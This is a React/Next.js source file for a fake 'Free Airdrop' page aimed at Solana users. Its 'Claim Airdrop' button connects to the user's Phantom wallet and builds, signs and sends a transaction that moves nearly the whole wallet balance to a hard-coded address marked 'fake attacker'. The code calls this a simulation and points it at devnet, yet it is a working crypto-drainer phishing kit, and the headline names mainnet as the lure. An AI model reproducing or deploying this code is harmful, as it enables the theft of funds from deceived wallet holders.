"use client";

import { useState } from "react";
import {
  Connection,
  PublicKey,
  SystemProgram,
  Transaction,
  LAMPORTS_PER_SOL,
} from "@solana/web3.js";

export default function Home() {
  const [walletAddress, setWalletAddress] = useState<string | null>(null);
  const [message, setMessage] = useState<string | null>(null);
  const [type, setType] = useState<"success" | "error" | "info" | null>(null);

  const showMessage = (msg: string, msgType: "success" | "error" | "info") => {
    setMessage(msg);
    setType(msgType);
    setTimeout(() => setMessage(null), 5000);
  };

  const connectWallet = async () => {
    try {
      const provider = (window as any).solana;
      if (provider?.isPhantom) {
        const res = await provider.connect();
        setWalletAddress(res.publicKey.toString());
        showMessage("Wallet connected: " + res.publicKey.toString(), "success");
      } else {
        showMessage("Phantom wallet not found!", "error");
      }
    } catch (err) {
      console.error("Wallet connect error", err);
      showMessage("Wallet connection failed.", "error");
    }
  };

  const simulateDrain = async () => {
    try {
      if (!walletAddress) return;

      const provider = (window as any).solana;
      const connection = new Connection("https://api.devnet.solana.com");

      const fromPubkey = new PublicKey(walletAddress);
      console.log("fromPubkey: ", fromPubkey);
      const toPubkey = new PublicKey(
        "AM2SvCUJKju76D7nChaxiAcvWdR1hyjq8pYcdXYScfQ4"
      ); // fake attacker

      const balance = await connection.getBalance(fromPubkey);
      const fee = 5000;
      const safeAmount = balance > fee ? balance - fee : 0;
      console.log("balance: ", balance / LAMPORTS_PER_SOL);

      const instruction = SystemProgram.transfer({
        fromPubkey,
        toPubkey,
        lamports: safeAmount,
      });

      const tx = new Transaction().add(instruction);
      tx.feePayer = fromPubkey;
      tx.recentBlockhash = (await connection.getLatestBlockhash()).blockhash;

      const signedTx = await provider.signTransaction(tx);
      const txid = await connection.sendRawTransaction(signedTx.serialize());
      await connection.confirmTransaction(txid, "confirmed");

      showMessage(`✅ Sent! TxID: ${txid}`, "success");
      console.log(`https://explorer.solana.com/tx/${txid}`);

      console.log("🚨 Simulated unsigned transaction:");
      console.log(tx);

      showMessage("Simulated malicious transaction! Check console.", "info");
    } catch (err) {
      console.error("Simulation error", err);
      showMessage("Error simulating transaction.", "error");
    }
  };

  return (
    <main className="flex min-h-screen flex-col items-center justify-center p-10 bg-black text-white">
      <h1 className="text-3xl font-bold mb-4">
        🚨 Free Airdrop. Only Solana Mainnet (0.01 SOL)
      </h1>

      {message && (
        <div
          className={`mb-6 px-4 py-3 rounded-md text-sm ${
            type === "success"
              ? "bg-green-700 text-white"
              : type === "error"
              ? "bg-red-700 text-white"
              : "bg-yellow-700 text-white"
          }`}
        >
          {message}
        </div>
      )}

      <button
        onClick={connectWallet}
        className="bg-green-600 px-6 py-2 rounded-md mb-4 hover:bg-green-700"
      >
        Connect Wallet
      </button>

      <button
        onClick={simulateDrain}
        className="bg-red-600 px-6 py-2 rounded-md hover:bg-red-700"
        disabled={!walletAddress}
      >
        Claim Airdrop
      </button>
    </main>
  );
}
